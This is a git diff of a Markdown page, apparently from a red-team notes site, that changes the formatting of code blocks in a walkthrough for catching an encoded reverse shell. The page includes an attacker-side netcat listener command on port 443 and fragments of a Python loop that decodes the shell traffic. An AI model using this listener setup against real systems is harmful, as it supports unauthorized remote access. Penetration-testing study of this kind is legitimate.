@@ -77,8 +77,7 @@ If we inspect the traffic, we confirm that the traffic is encoded:
 
 If we are listening for a shell in netcat on a Linux box with no powershell \(my kali was giving me a hard time trying to install powershell\), we need to hack together a filthy python loop that will do the decoding for us first:
 
-{% tabs %}
-{% tab title="decode.py@kali" %}
+{% code title="decode.py@kali" %}
 ```python
 #!/usr/bin/python3
 import os, time
@@ -107,28 +106,23 @@ while 1:
     os.system("echo > myfile")
     time.sleep(1)
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 Let's launch the netcat listener on a linux box and pipe the output to `tee` so it can be put to a file `myfile`
 
-{% tabs %}
-{% tab title="attacker@kali" %}
+{% code title="attacker@kali" %}
 ```text
 nc -lvvp 443 | tee myfile
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 In another terminal, we need to launch the `decoder.py` which will read the `myfile` every second and will decode its content and wipe it:
 
-{% tabs %}
-{% tab title="attacker@kali" %}
+{% code title="attacker@kali" %}
 ```text
 ./decoder.py
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/annotation-2019-05-18-132903.png)
 
